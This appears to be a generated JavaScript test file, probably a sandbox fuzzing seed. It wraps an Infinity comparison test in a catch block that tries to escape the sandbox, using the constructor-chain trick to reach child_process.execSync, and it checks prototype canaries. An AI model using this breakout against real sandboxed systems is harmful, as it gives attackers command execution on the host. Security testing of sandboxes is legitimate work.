try {
    if (0 < Number.POSITIVE_INFINITY !== true) {
        $ERROR('#1: (0 < +Infinity) === true');
    }
    if (1.1 < Number.POSITIVE_INFINITY !== true) {
        $ERROR('#2: (1.1 < +Infinity) === true');
    }
    if (-1.1 < Number.POSITIVE_INFINITY !== true) {
        $ERROR('#3: (-1.1 < +Infinity) === true');
    }
    if (Number.NEGATIVE_INFINITY < Number.POSITIVE_INFINITY !== true) {
        $ERROR('#4: (-Infinity < +Infinity) === true');
    }
    if (Number.MAX_VALUE < Number.POSITIVE_INFINITY !== true) {
        $ERROR('#5: (Number.MAX_VALUE < +Infinity) === true');
    }
    if (Number.MIN_VALUE < Number.POSITIVE_INFINITY !== true) {
        $ERROR('#6: (Number.MIN_VALUE < +Infinity) === true');
    }
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}